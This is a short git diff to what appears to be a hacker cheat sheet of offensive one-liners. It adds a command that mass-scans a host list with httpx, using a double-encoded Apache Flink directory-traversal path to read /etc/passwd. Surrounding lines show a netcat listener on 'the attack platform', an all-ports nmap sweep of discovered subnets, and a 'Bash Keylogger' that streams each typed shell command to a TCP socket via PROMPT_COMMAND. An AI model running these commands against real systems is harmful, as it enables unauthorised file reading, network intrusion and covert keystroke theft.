@@ -14,6 +14,12 @@ On the attack platform: ```nc -lvp 1234```
 ifconfig -a | grep -Po '\b(?!255)(?:\d{1,3}\.){3}(?!255)\d{1,3}\b' | xargs nmap -A -p0-
 ```
 
+## Apache Flink Directory Traversal 
+
+```
+cat hosts | httpx -nc -t 300 -p 80,443,8080,8443,8888,8088 -path "/jobmanager/logs/..%252f..%252f..%252f......%252f..%252fetc%252fpasswd" -mr "root:x" -silent
+```
+
 ## Bash Keylogger:
 
 ```PROMPT_COMMAND='history -a; tail -n1 ~/.bash_history > /dev/tcp/127.0.0.1/9000'```
